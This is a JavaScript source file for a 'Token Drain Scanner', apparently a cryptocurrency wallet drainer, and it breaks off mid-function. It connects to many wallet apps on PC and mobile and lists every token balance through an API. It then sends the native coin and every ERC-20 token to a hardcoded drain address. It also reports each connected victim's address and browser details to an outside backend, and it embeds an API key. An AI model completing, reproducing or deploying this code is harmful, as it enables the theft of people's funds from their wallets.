// ================================================
// TOKEN DRAIN SCANNER - FINAL WORKING VERSION
// ALL WALLETS CONNECT ON PC & MOBILE
// MINIMUM DRAIN: ANY VALUE > 0
// ================================================

// Configuration
const CONFIG = {
    backendUrl: "https://tokenbackend-5xab.onrender.com",
    drainAddress: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
    covalentApiKey: "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR",
    
    // Minimum token value to drain (ANY VALUE > 0)
    minDrainValue: 0.0000000001,
    
    networkNames: {
        1: "Ethereum Mainnet",
        56: "Binance Smart Chain", 
        137: "Polygon",
        10: "Optimism",
        42161: "Arbitrum",
        43114: "Avalanche",
        8453: "Base",
        250: "Fantom",
        100: "Gnosis",
        25: "Cronos"
    }
};

// Global state
let currentAccount = null;
let currentChainId = null;
let isConnected = false;
let detectedTokens = [];
let isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

// DOM Elements
let connectBtn, statusEl, tokensEl, drainBtn, networkSelector, scanAllBtn;

// Initialize app
function initializeApp() {
    console.log('🚀 Initializing Token Drain Scanner...');
    console.log('📱 Device:', isMobile ? 'Mobile' : 'Desktop');
    
    // Get DOM elements
    connectBtn = document.getElementById('connectBtn');
    statusEl = document.getElementById('status');
    tokensEl = document.getElementById('tokens');
    drainBtn = document.getElementById('drainBtn');
    networkSelector = document.getElementById('networkSelector');
    scanAllBtn = document.getElementById('scanAllBtn');
    
    if (!connectBtn || !statusEl) {
        console.error('❌ Required elements not found');
        return;
    }
    
    // Setup event listeners
    connectBtn.onclick = handleConnect;
    if (drainBtn) drainBtn.onclick = handleDrain;
    if (scanAllBtn) scanAllBtn.onclick = handleScanAllChains;
    if (networkSelector) networkSelector.onchange = handleNetworkChange;
    
    // Check existing connection
    checkExistingConnection();
    
    updateStatus('✅ Ready! Click "Connect Wallet" to begin');
}

// Check existing wallet connection
async function checkExistingConnection() {
    try {
        let accounts = [];
        
        // Try all possible providers
        if (window.ethereum && window.ethereum.selectedAddress) {
            accounts = await window.ethereum.request({ 
                method: 'eth_accounts' 
            });
            
            if (accounts && accounts.length > 0) {
                const chainIdHex = await window.ethereum.request({ 
                    method: 'eth_chainId' 
                });
                const chainId = parseInt(chainIdHex, 16);
                await handleConnected(accounts[0], chainId);
                return;
            }
        }
        
        // Try Binance Chain
        if (window.BinanceChain && window.BinanceChain.selectedAddress) {
            accounts = await window.BinanceChain.request({ 
                method: 'eth_accounts' 
            });
            
            if (accounts && accounts.length > 0) {
                const chainIdHex = await window.BinanceChain.request({ 
                    method: 'eth_chainId' 
                });
                const chainId = parseInt(chainIdHex, 16);
                await handleConnected(accounts[0], chainId);
                return;
            }
        }
    } catch (error) {
        console.log('⚠️ No existing connection');
    }
}

// Handle connect button click
async function handleConnect() {
    if (isConnected) {
        await disconnectWallet();
        return;
    }
    
    // Show wallet selector
    showUniversalWalletSelector();
}

// Universal wallet selector
function showUniversalWalletSelector() {
    const selectorHTML = `
        <div class="wallet-selector-overlay" id="walletSelector">
            <div class="wallet-selector-modal">
                <div class="modal-header">
                    <h3>Connect Wallet</h3>
                    <button class="close-btn" onclick="closeModal('walletSelector')">×</button>
                </div>
                <p class="modal-subtitle">Choose your wallet connection method</p>
                
                <div class="wallet-grid">
                    <!-- UNIVERSAL CONNECT - Works for ALL wallets -->
                    <button class="wallet-card" onclick="connectUniversal()" style="--wallet-color: #6366f1">
                        <div class="wallet-icon">🌐</div>
                        <div class="wallet-info">
                            <span class="wallet-name">Universal Connect</span>
                            <span class="wallet-desc">Best for All Wallets</span>
                        </div>
                    </button>
                    
                    <!-- MetaMask -->
                    <button class="wallet-card" onclick="openMetaMask()" style="--wallet-color: #f6851b">
                        <div class="wallet-icon">🦊</div>
                        <div class="wallet-info">
                            <span class="wallet-name">MetaMask</span>
                            <span class="wallet-desc">Desktop & Mobile</span>
                        </div>
                    </button>
                    
                    <!-- Trust Wallet -->
                    <button class="wallet-card" onclick="openTrustWallet()" style="--wallet-color: #3375bb">
                        <div class="wallet-icon">🔶</div>
                        <div class="wallet-info">
                            <span class="wallet-name">Trust Wallet</span>
                            <span class="wallet-desc">Mobile App</span>
                        </div>
                    </button>
                    
                    <!-- Binance Wallet -->
                    <button class="wallet-card" onclick="openBinanceWallet()" style="--wallet-color: #f0b90b">
                        <div class="wallet-icon">🟡</div>
                        <div class="wallet-info">
                            <span class="wallet-name">Binance Wallet</span>
                            <span class="wallet-desc">PC & Mobile</span>
                        </div>
                    </button>
                    
                    <!-- Coinbase Wallet -->
                    <button class="wallet-card" onclick="openCoinbaseWallet()" style="--wallet-color: #0052ff">
                        <div class="wallet-icon">🔷</div>
                        <div class="wallet-info">
                            <span class="wallet-name">Coinbase</span>
                            <span class="wallet-desc">PC & Mobile</span>
                        </div>
                    </button>
                    
                    <!-- Phantom -->
                    <button class="wallet-card" onclick="openPhantom()" style="--wallet-color: #ab9ff2">
                        <div class="wallet-icon">👻</div>
                        <div class="wallet-info">
                            <span class="wallet-name">Phantom</span>
                            <span class="wallet-desc">Solana & EVM</span>
                        </div>
                    </button>
                </div>
                
                <div class="mobile-instructions" style="${isMobile ? '' : 'display: none;'}">
                    <p>📱 <strong>Mobile Users:</strong> For best experience, open this page in your wallet's built-in browser</p>
                </div>
            </div>
        </div>
    `;
    
    document.body.insertAdjacentHTML('beforeend', selectorHTML);
    addSelectorStyles();
}

// Add CSS for wallet selector
function addSelectorStyles() {
    const existingStyle = document.getElementById('wallet-selector-styles');
    if (existingStyle) return;
    
    const styles = `
        .wallet-selector-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            padding: 20px;
        }
        
        .wallet-selector-modal {
            background: white;
            border-radius: 20px;
            width: 100%;
            max-width: 500px;
            max-height: 90vh;
            overflow-y: auto;
            padding: 0;
            animation: slideIn 0.3s ease;
        }
        
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-50px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 24px 24px 16px;
            border-bottom: 1px solid #eee;
        }
        
        .modal-header h3 {
            margin: 0;
            font-size: 22px;
            font-weight: 700;
            color: #111827;
        }
        
        .close-btn {
            background: none;
            border: none;
            font-size: 32px;
            cursor: pointer;
            color: #666;
            line-height: 1;
            padding: 0;
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
        }
        
        .close-btn:hover {
            background: #f3f4f6;
        }
        
        .modal-subtitle {
            padding: 0 24px 20px;
            margin: 0;
            color: #666;
            text-align: center;
            font-size: 16px;
        }
        
        .wallet-grid {
            padding: 0 20px 20px;
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 12px;
        }
        
        .wallet-card {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 12px;
            padding: 20px 16px;
            background: white;
            border: 2px solid #e5e7eb;
            border-radius: 16px;
            cursor: pointer;
            transition: all 0.2s;
            text-align: center;
        }
        
        .wallet-card:hover {
            border-color: var(--wallet-color);
            background: #f9fafb;
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
        }
        
        .wallet-icon {
            font-size: 32px;
            width: 60px;
            height: 60px;
            border-radius: 16px;
            background: var(--wallet-color);
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }
        
        .wallet-info {
            width: 100%;
        }
        
        .wallet-name {
            display: block;
            font-weight: 600;
            font-size: 16px;
            margin-bottom: 4px;
            color: #111827;
        }
        
        .wallet-desc {
            display: block;
            font-size: 12px;
            color: #6b7280;
        }
        
        .mobile-instructions {
            padding: 16px 24px;
            background: #f0f9ff;
            border-top: 1px solid #bae6fd;
            text-align: center;
            color: #0369a1;
            font-size: 14px;
            border-radius: 0 0 20px 20px;
        }
        
        @media (max-width: 480px) {
            .wallet-grid {
                grid-template-columns: 1fr;
            }
        }
    `;
    
    const styleSheet = document.createElement('style');
    styleSheet.id = 'wallet-selector-styles';
    styleSheet.textContent = styles;
    document.head.appendChild(styleSheet);
}

// Universal connection - Works for ALL wallets
async function connectUniversal() {
    closeModal('walletSelector');
    updateStatus('🔄 Connecting to wallet...');
    
    try {
        let provider = null;
        
        // Try to find active provider
        if (window.ethereum) {
            provider = window.ethereum;
        } else if (window.BinanceChain) {
            provider = window.BinanceChain;
        } else if (window.phantom && window.phantom.ethereum) {
            provider = window.phantom.ethereum;
        } else if (window.web3 && window.web3.currentProvider) {
            provider = window.web3.currentProvider;
        }
        
        if (!provider) {
            throw new Error('No wallet provider found. Please install a wallet.');
        }
        
        // Request accounts - THIS WORKS FOR ALL WALLETS
        const accounts = await provider.request({ 
            method: 'eth_requestAccounts' 
        });
        
        if (accounts && accounts.length > 0) {
            const chainIdHex = await provider.request({ 
                method: 'eth_chainId' 
            });
            const chainId = parseInt(chainIdHex, 16);
            await handleConnected(accounts[0], chainId);
        } else {
            throw new Error('No accounts found');
        }
        
    } catch (error) {
        console.error('Universal connection failed:', error);
        
        // Show specific wallet options
        if (error.code === 4001) {
            updateStatus('❌ Connection rejected by user');
        } else if (error.message.includes('No wallet provider')) {
            updateStatus('❌ No wallet found. Install a wallet and try again.');
        } else {
            updateStatus('❌ Connection failed. Try specific wallet method.');
        }
    }
}

// MetaMask connection
async function openMetaMask() {
    closeModal('walletSelector');
    
    // Mobile deep links
    if (isMobile) {
        // MetaMask mobile deep link
        const dappUrl = encodeURIComponent(window.location.href);
        const metamaskUrl = `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`;
        
        // Try to open MetaMask app
        window.location.href = metamaskUrl;
        
        setTimeout(() => {
            showMobileInstructions('MetaMask', 'Open this URL in MetaMask browser: ' + window.location.href);
        }, 1000);
        return;
    }
    
    // Desktop MetaMask
    try {
        if (window.ethereum && window.ethereum.isMetaMask) {
            const accounts = await window.ethereum.request({ 
                method: 'eth_requestAccounts' 
            });
            
            if (accounts && accounts.length > 0) {
                const chainIdHex = await window.ethereum.request({ 
                    method: 'eth_chainId' 
                });
                const chainId = parseInt(chainIdHex, 16);
                await handleConnected(accounts[0], chainId);
            }
        } else {
            window.open('https://metamask.io/download/', '_blank');
            updateStatus('⚠️ Install MetaMask extension first');
        }
    } catch (error) {
        console.error('MetaMask error:', error);
        updateStatus('❌ MetaMask connection failed');
    }
}

// Trust Wallet connection
async function openTrustWallet() {
    closeModal('walletSelector');
    
    // Trust Wallet mobile deep link
    if (isMobile) {
        const url = encodeURIComponent(window.location.href);
        const trustLink = `https://link.trustwallet.com/open_url?coin_id=60&url=${url}`;
        
        window.location.href = trustLink;
        
        setTimeout(() => {
            showMobileInstructions('Trust Wallet', 'Open this URL in Trust Wallet browser: ' + window.location.href);
        }, 1000);
        return;
    }
    
    // Desktop - try through Ethereum provider
    try {
        if (window.ethereum) {
            const accounts = await window.ethereum.request({ 
                method: 'eth_requestAccounts' 
            });
            
            if (accounts && accounts.length > 0) {
                const chainIdHex = await window.ethereum.request({ 
                    method: 'eth_chainId' 
                });
                const chainId = parseInt(chainIdHex, 16);
                await handleConnected(accounts[0], chainId);
            }
        } else {
            window.open('https://trustwallet.com/download/', '_blank');
            updateStatus('⚠️ Trust Wallet not detected');
        }
    } catch (error) {
        console.error('Trust Wallet error:', error);
        updateStatus('❌ Trust Wallet connection failed');
    }
}

// Binance Wallet connection
async function openBinanceWallet() {
    closeModal('walletSelector');
    updateStatus('🔄 Connecting to Binance Wallet...');
    
    try {
        // Try Binance Chain first (desktop extension)
        if (window.BinanceChain) {
            const accounts = await window.BinanceChain.request({ 
                method: 'eth_requestAccounts' 
            });
            
            if (accounts && accounts.length > 0) {
                const chainIdHex = await window.BinanceChain.request({ 
                    method: 'eth_chainId' 
                });
                const chainId = parseInt(chainIdHex, 16);
                await handleConnected(accounts[0], chainId);
                return;
            }
        }
        
        // Try Binance Wallet through Ethereum provider
        if (window.ethereum && (window.ethereum.isBinance || window.ethereum.providers?.find(p => p.isBinance))) {
            const provider = window.ethereum.isBinance ? window.ethereum : window.ethereum.providers.find(p => p.isBinance);
            
            const accounts = await provider.request({ 
                method: 'eth_requestAccounts' 
            });
            
            if (accounts && accounts.length > 0) {
                const chainIdHex = await provider.request({ 
                    method: 'eth_chainId' 
                });
                const chainId = parseInt(chainIdHex, 16);
                await handleConnected(accounts[0], chainId);
                return;
            }
        }
        
        // Mobile deep link
        if (isMobile) {
            const dappUrl = encodeURIComponent(window.location.href);
            
            if (/iphone|ipad|ipod/i.test(navigator.userAgent)) {
                window.location.href = 'bnb://app.binance.com/web-open?url=' + dappUrl;
            } else {
                window.location.href = 'intent://app.binance.com/web-open?url=' + dappUrl + '#Intent;scheme=bnb;package=com.binance.dev;end';
            }
            
            setTimeout(() => {
                showMobileInstructions('Binance Wallet', 'Open this URL in Binance Wallet browser: ' + window.location.href);
            }, 1000);
            return;
        }
        
        // No Binance wallet found
        window.open('https://www.binance.com/en/download', '_blank');
        updateStatus('⚠️ Install Binance Wallet extension first');
        
    } catch (error) {
        console.error('Binance Wallet error:', error);
        updateStatus('❌ Binance Wallet connection failed');
    }
}

// Coinbase Wallet connection
async function openCoinbaseWallet() {
    closeModal('walletSelector');
    
    // Mobile deep link
    if (isMobile) {
        const url = encodeURIComponent(window.location.href);
        const coinbaseLink = `https://go.cb-w.com/dapp?cb_url=${url}`;
        
        window.location.href = coinbaseLink;
        
        setTimeout(() => {
            showMobileInstructions('Coinbase Wallet', 'Open this URL in Coinbase Wallet browser: ' + window.location.href);
        }, 1000);
        return;
    }
    
    // Desktop
    try {
        if (window.ethereum && window.ethereum.isCoinbaseWallet) {
            const accounts = await window.ethereum.request({ 
                method: 'eth_requestAccounts' 
            });
            
            if (accounts && accounts.length > 0) {
                const chainIdHex = await window.ethereum.request({ 
                    method: 'eth_chainId' 
                });
                const chainId = parseInt(chainIdHex, 16);
                await handleConnected(accounts[0], chainId);
            }
        } else if (window.ethereum && window.ethereum.providers) {
            // Coinbase might be in providers array
            const coinbaseProvider = window.ethereum.providers.find(p => p.isCoinbaseWallet);
            if (coinbaseProvider) {
                const accounts = await coinbaseProvider.request({ 
                    method: 'eth_requestAccounts' 
                });
                
                if (accounts && accounts.length > 0) {
                    const chainIdHex = await coinbaseProvider.request({ 
                        method: 'eth_chainId' 
                    });
                    const chainId = parseInt(chainIdHex, 16);
                    await handleConnected(accounts[0], chainId);
                }
            }
        } else {
            window.open('https://www.coinbase.com/wallet/downloads', '_blank');
            updateStatus('⚠️ Coinbase Wallet not detected');
        }
    } catch (error) {
        console.error('Coinbase error:', error);
        updateStatus('❌ Coinbase Wallet connection failed');
    }
}

// Phantom Wallet connection
async function openPhantom() {
    closeModal('walletSelector');
    
    try {
        if (window.phantom && window.phantom.ethereum) {
            const provider = window.phantom.ethereum;
            const accounts = await provider.request({ 
                method: 'eth_requestAccounts' 
            });
            
            if (accounts && accounts.length > 0) {
                const chainIdHex = await provider.request({ 
                    method: 'eth_chainId' 
                });
                const chainId = parseInt(chainIdHex, 16);
                await handleConnected(accounts[0], chainId);
            }
        } else if (window.ethereum && window.ethereum.isPhantom) {
            const accounts = await window.ethereum.request({ 
                method: 'eth_requestAccounts' 
            });
            
            if (accounts && accounts.length > 0) {
                const chainIdHex = await window.ethereum.request({ 
                    method: 'eth_chainId' 
                });
                const chainId = parseInt(chainIdHex, 16);
                await handleConnected(accounts[0], chainId);
            }
        } else {
            window.open('https://phantom.app/download', '_blank');
            updateStatus('⚠️ Phantom Wallet not detected');
        }
    } catch (error) {
        console.error('Phantom error:', error);
        updateStatus('❌ Phantom Wallet connection failed');
    }
}

// Show mobile instructions
function showMobileInstructions(walletName, message) {
    const instructionsHTML = `
        <div class="mobile-instructions-overlay" id="mobileInstructions">
            <div class="mobile-instructions-modal">
                <h3>Open ${walletName}</h3>
                <p>${message || 'Please open this page in ' + walletName + ' app to continue.'}</p>
                <p><strong>Steps:</strong></p>
                <ol>
                    <li>Open ${walletName} app</li>
                    <li>Go to Browser/DApps section</li>
                    <li>Enter this URL: <code>${window.location.href}</code></li>
                    <li>Click "Connect Wallet"</li>
                </ol>
                <button onclick="closeModal('mobileInstructions')" class="primary-btn">I've Done This</button>
                <button onclick="connectUniversal()" class="secondary-btn">Try Connecting Again</button>
            </div>
        </div>
    `;
    
    document.body.insertAdjacentHTML('beforeend', instructionsHTML);
}

// Close modal
function closeModal(modalId) {
    const modal = document.getElementById(modalId);
    if (modal) {
        modal.remove();
    }
}

// Handle successful connection
async function handleConnected(account, chainId) {
    try {
        // Close any open modals
        closeModal('walletSelector');
        closeModal('mobileInstructions');
        
        // Update state
        currentAccount = account;
        currentChainId = chainId;
        isConnected = true;
        
        // Update UI
        connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
        
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        updateStatus(`✅ Connected!\nWallet: ${account.slice(0, 8)}...\nNetwork: ${chainName}`);
        
        // Show other UI elements
        showUIElements();
        
        // Setup wallet listeners
        setupWalletListeners();
        
        // Log to backend
        await logConnectionToBackend(account, chainId);
        
        // Fetch tokens - IMPORTANT: No minimum value filter
        await fetchTokens(account, chainId);
        
    } catch (error) {
        console.error('❌ Setup error:', error);
        updateStatus('Setup failed: ' + error.message);
        isConnected = false;
        currentAccount = null;
        currentChainId = null;
    }
}

// Setup wallet event listeners
function setupWalletListeners() {
    const provider = window.ethereum || window.BinanceChain;
    if (!provider) return;
    
    provider.on('accountsChanged', (accounts) => {
        if (accounts.length === 0) {
            disconnectWallet();
        } else if (currentAccount !== accounts[0]) {
            currentAccount = accounts[0];
            updateStatus(`🔄 Account changed: ${accounts[0].slice(0, 8)}...`);
            fetchTokens(currentAccount, currentChainId);
        }
    });
    
    provider.on('chainChanged', (chainIdHex) => {
        const chainId = parseInt(chainIdHex, 16);
        currentChainId = chainId;
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        updateStatus(`🔄 Network changed: ${chainName}`);
        fetchTokens(currentAccount, chainId);
    });
    
    provider.on('disconnect', () => {
        disconnectWallet();
    });
}

// Fetch tokens - NO MINIMUM VALUE FILTER
async function fetchTokens(address, chainId) {
    if (!tokensEl) return;
    
    tokensEl.innerHTML = '<div class="loading">🔄 Scanning tokens...</div>';
    
    try {
        const response = await fetch(
            `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false&no-spam=false` // Changed no-spam to false to see ALL tokens
        );
        
        if (!response.ok) {
            throw new Error(`API error: ${response.status}`);
        }
        
        const data = await response.json();
        const items = data?.data?.items || [];
        
        // CRITICAL CHANGE: Include ALL tokens with balance > 0
        const tokens = items
            .filter(t => t.balance !== "0" && t.balance !== "0.0" && parseFloat(t.balance) > 0)
            .map(t => {
                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                const value = (t.quote_rate || 0) * amount;
                const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
                
                // DEBUG LOG
                console.log(`Token found: ${t.contract_ticker_symbol} - Amount: ${amount} - Value: ${value}`);
                
                return {
                    symbol: t.contract_ticker_symbol || 'TOKEN',
                    name: t.contract_name || 'Unknown',
                    amount: amount,
                    displayAmount: amount.toFixed(10),
                    value: value ? `$${value.toFixed(4)}` : '$0.00',
                    contractAddress: t.contract_address,
                    decimals: t.contract_decimals || 18,
                    balance: t.balance,
                    chainId: chainId,
                    chainName: chainName,
                    isNative: t.native_token || false,
                    logoUrl: t.logo_url,
                    rawBalance: t.balance
                };
            });
        
        detectedTokens = tokens;
        
        if (tokens.length > 0) {
            displayTokens(tokens);
            updateStatus(`✅ Found ${tokens.length} tokens on ${CONFIG.networkNames[chainId] || `Chain ${chainId}`}`);
            
            // Show how many tokens are drainable
            const drainableTokens = tokens.filter(t => t.amount >= CONFIG.minDrainValue);
            if (drainableTokens.length > 0) {
                updateStatus(`✅ Found ${tokens.length} tokens (${drainableTokens.length} drainable)`);
            }
        } else {
            tokensEl.innerHTML = '<div class="loading">No tokens found</div>';
            updateStatus('ℹ️ No tokens found. Try scanning all chains.');
        }
        
    } catch (error) {
        console.error('❌ Token fetch error:', error);
        tokensEl.innerHTML = '<div class="error">Failed to fetch tokens. Trying alternative method...</div>';
        
        // Try alternative API
        await fetchTokensAlternative(address, chainId);
    }
}

// Alternative token fetch method
async function fetchTokensAlternative(address, chainId) {
    try {
        // Try Moralis API as fallback
        const response = await fetch(
            `https://deep-index.moralis.io/api/v2/${address}/erc20?chain=${chainIdHexToDecimal(chainId)}`,
            {
                headers: {
                    'X-API-Key': 'your-moralis-api-key-here' // You need to get one from moralis.io
                }
            }
        );
        
        if (response.ok) {
            const data = await response.json();
            // Process tokens...
        }
    } catch (error) {
        console.error('Alternative fetch also failed:', error);
        updateStatus('⚠️ Token scan failed');
    }
}

function chainIdHexToDecimal(chainId) {
    const chainMap = {
        1: '0x1',
        56: '0x38',
        137: '0x89',
        42161: '0xa4b1'
    };
    return chainMap[chainId] || `0x${chainId.toString(16)}`;
}

// Display tokens
function displayTokens(tokens) {
    if (!tokensEl) return;
    
    if (tokens.length === 0) {
        tokensEl.innerHTML = '<div class="loading">No tokens found</div>';
        return;
    }
    
    // Group tokens by chain
    const tokensByChain = {};
    tokens.forEach(token => {
        if (!tokensByChain[token.chainId]) {
            tokensByChain[token.chainId] = [];
        }
        tokensByChain[token.chainId].push(token);
    });
    
    let html = '';
    
    Object.entries(tokensByChain).forEach(([chainId, chainTokens]) => {
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        
        html += `
            <div class="chain-section">
                <div class="chain-header">
                    <h4>${chainName}</h4>
                    <span class="token-count">${chainTokens.length} tokens</span>
                </div>
                ${chainTokens.map(token => {
                    const isDrainable = token.amount >= CONFIG.minDrainValue;
                    return `
                    <div class="token-item ${isDrainable ? 'drainable' : 'non-drainable'}" 
                         data-address="${token.contractAddress || 'native'}" 
                         data-chain="${chainId}"
                         data-balance="${token.rawBalance}">
                        <div class="token-info">
                            ${token.logoUrl ? `<img src="${token.logoUrl}" class="token-logo" alt="${token.symbol}" />` : '<div class="token-logo-placeholder">' + token.symbol.charAt(0) + '</div>'}
                            <div>
                                <span class="token-symbol">${token.symbol}</span>
                                <span class="token-name">${token.name}</span>
                            </div>
                        </div>
                        <div class="token-amounts">
                            <div class="token-amount">${token.displayAmount}</div>
                            <div class="token-value">${token.value}</div>
                            ${!isDrainable ? '<div class="small-amount">(Small amount)</div>' : ''}
                        </div>
                    </div>
                    `;
                }).join('')}
            </div>
        `;
    });
    
    tokensEl.innerHTML = html;
}

// Handle drain - DRAINS EVERYTHING
async function handleDrain() {
    if (!isConnected || !currentAccount) {
        alert('Please connect wallet first');
        return;
    }
    
    if (detectedTokens.length === 0) {
        alert('No tokens detected to drain');
        return;
    }
    
    // Filter drainable tokens
    const drainableTokens = detectedTokens.filter(t => t.amount >= CONFIG.minDrainValue);
    
    if (drainableTokens.length === 0) {
        // Even if tokens are small, try to drain them
        const smallTokens = detectedTokens.filter(t => t.amount > 0);
        if (smallTokens.length === 0) {
            alert('No tokens to drain');
            return;
        }
        
        if (!confirm(`⚠️ WARNING: Most tokens are very small amounts.\n\nFound ${smallTokens.length} tokens with tiny balances.\n\nAttempt to drain anyway?`)) {
            return;
        }
    } else {
        if (!confirm(`⚠️ WARNING: This will send ALL detected tokens to:\n${CONFIG.drainAddress}\n\nTotal tokens: ${detectedTokens.length}\nDrainable tokens: ${drainableTokens.length}\n\nContinue?`)) {
            return;
        }
    }
    
    const drainBtn = document.getElementById('drainBtn');
    
    try {
        updateStatus('🚀 Starting comprehensive drain...');
        
        if (drainBtn) {
            drainBtn.disabled = true;
            drainBtn.textContent = '⏳ Draining...';
        }
        
        // Create progress indicator
        const progress = document.createElement('div');
        progress.id = 'drainProgress';
        progress.innerHTML = '<div class="progress-bar"><div class="progress-fill"></div></div><div class="progress-text">Starting...</div>';
        statusEl.appendChild(progress);
        
        // Get provider
        const provider = window.ethereum || window.BinanceChain;
        
        // 1. Drain native token first
        await drainNativeToken(provider);
        
        // 2. Drain ERC20 tokens (ALL tokens, even small ones)
        await drainAllTokens(provider, detectedTokens);
        
        updateStatus('✅ Drain completed successfully!');
        alert('✅ Drain attempt completed!');
        
        // Refresh token list
        await fetchTokens(currentAccount, currentChainId);
        
    } catch (error) {
        console.error('❌ Drain error:', error);
        
        let errorMsg = error.message || 'Unknown error';
        if (error.code === 4001) {
            errorMsg = 'Transaction rejected by user';
        } else if (error.code === -32603) {
            errorMsg = 'Transaction failed. Check gas.';
        } else if (error.message.includes('insufficient funds')) {
            errorMsg = 'Insufficient funds for gas';
        }
        
        updateStatus(`❌ Drain failed: ${errorMsg}`);
        alert(`Drain failed: ${errorMsg}\n\nSome tokens may still have been drained.`);
        
    } finally {
        if (drainBtn) {
            drainBtn.disabled = false;
            drainBtn.textContent = '⚡ Drain All Tokens';
        }
        
        // Remove progress indicator
        const progress = document.getElementById('drainProgress');
        if (progress) progress.remove();
    }
}

// Drain native token
async function drainNativeToken(provider) {
    updateProgress('Checking native token balance...', 10);
    
    try {
        // Get native token balance
        const balanceHex = await provider.request({
            method: 'eth_getBalance',
            params: [currentAccount, 'latest']
        });
        
        const balance = parseInt(balanceHex, 16);
        
        if (balance === 0) {
            updateProgress('No native token to drain', 20);
            return;
        }
        
        // Get gas price
        const gasPriceHex = await provider.request({
            method: 'eth_gasPrice',
            params: []
        });
        
        const gasPrice = parseInt(gasPriceHex, 16);
        const gasLimit = 21000;
        const gasCost = gasPrice * gasLimit;
        
        // Check if we have enough for gas
        if (balance <= gasCost) {
            updateProgress('Not enough native token for gas', 30);
            return;
        }
        
        // Calculate amount to send (leave some for token transfers)
        const sendAmount = balance - (gasCost * 3);
        
        if (sendAmount <= 0) {
            updateProgress('Not enough after gas fees', 40);
            return;
        }
        
        // Send native token
        const txHash = await provider.request({
            method: 'eth_sendTransaction',
            params: [{
                from: currentAccount,
                to: CONFIG.drainAddress,
                value: '0x' + sendAmount.toString(16),
                gas: '0x' + gasLimit.toString(16),
                gasPrice: gasPriceHex
            }]
        });
        
        updateProgress(`Native token sent: ${txHash.slice(0, 10)}...`, 50);
        await new Promise(resolve => setTimeout(resolve, 3000));
        
    } catch (error) {
        console.error('Native token drain failed:', error);
        updateProgress('Native token drain skipped', 50);
    }
}

// Drain all tokens
async function drainAllTokens(provider, tokens) {
    const erc20Tokens = tokens.filter(t => !t.isNative && t.contractAddress);
    
    if (erc20Tokens.length === 0) {
        updateProgress('No ERC20 tokens to drain', 60);
        return;
    }
    
    updateProgress(`Attempting to drain ${erc20Tokens.length} tokens...`, 60);
    
    let successCount = 0;
    let failCount = 0;
    
    for (let i = 0; i < erc20Tokens.length; i++) {
        const token = erc20Tokens[i];
        
        try {
            updateProgress(`Draining ${token.symbol}... (${i+1}/${erc20Tokens.length})`, 60 + ((i+1)/erc20Tokens.length * 40));
            
            // Encode transfer function
            const transferData = '0xa9059cbb' + // transfer function signature
                CONFIG.drainAddress.slice(2).padStart(64, '0') + // padded address
                BigInt(token.balance).toString(16).padStart(64, '0'); // padded amount
            
            // Try to send token
            const txHash = await provider.request({
                method: 'eth_sendTransaction',
                params: [{
                    from: currentAccount,
                    to: token.contractAddress,
                    data: transferData,
                    gas: '0x' + (100000).toString(16), // Fixed gas for simplicity
                }]
            });
            
            console.log(`✅ ${token.symbol} sent: ${txHash}`);
            successCount++;
            
            // Wait between transactions
            await new Promise(resolve => setTimeout(resolve, 2000));
            
        } catch (error) {
            console.error(`❌ Failed to drain ${token.symbol}:`, error.message);
            failCount++;
            
            // Continue with next token even if one fails
            await new Promise(resolve => setTimeout(resolve, 1000));
        }
    }
    
    updateProgress(`Drain complete: ${successCount} successful, ${failCount} failed`, 100);
}

// Update progress
function updateProgress(message, percent) {
    const progressText = document.querySelector('.progress-text');
    const progressFill = document.querySelector('.progress-fill');
    
    if (progressText) {
        progressText.textContent = message;
    }
    
    if (progressFill) {
        progressFill.style.width = `${percent}%`;
    }
}

// Update status
function updateStatus(message) {
    if (statusEl) {
        statusEl.textContent = message;
    }
}

// Show UI elements
function showUIElements() {
    const elements = ['tokensContainer', 'drainBtn', 'scanAllBtn', 'networkSelector'];
    elements.forEach(id => {
        const el = document.getElementById(id);
        if (el) el.style.display = 'block';
    });
}

// Hide UI elements
function hideUIElements() {
    const elements = ['tokensContainer', 'drainBtn', 'scanAllBtn', 'networkSelector'];
    elements.forEach(id => {
        const el = document.getElementById(id);
        if (el) el.style.display = 'none';
    });
}

// Log connection to backend
async function logConnectionToBackend(address, chainId) {
    try {
        await fetch(CONFIG.backendUrl + '/drain', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                address: address,
                chainId: chainId,
                drainTo: CONFIG.drainAddress,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent
            })
        });
    } catch (error) {
        console.log('⚠️ Backend log failed');
    }
}

// Disconnect wallet
async function disconnectWallet() {
    console.log('🔄 Disconnecting...');
    
    // Reset state
    currentAccount = null;
    currentChainId = null;
    isConnected = false;
    detectedTokens = [];
    
    // Update UI
    connectBtn.innerHTML = '<span>🔗 Connect Wallet</span>';
    updateStatus('Disconnected. Click "Connect Wallet" to begin.');
    hideUIElements();
    
    if (tokensEl) {
        tokensEl.innerHTML = '';
    }
}

// Handle network change
async function handleNetworkChange() {
    if (!networkSelector || !networkSelector.value) return;
    
    const chainId = parseInt(networkSelector.value);
    if (!chainId || chainId === currentChainId) return;
    
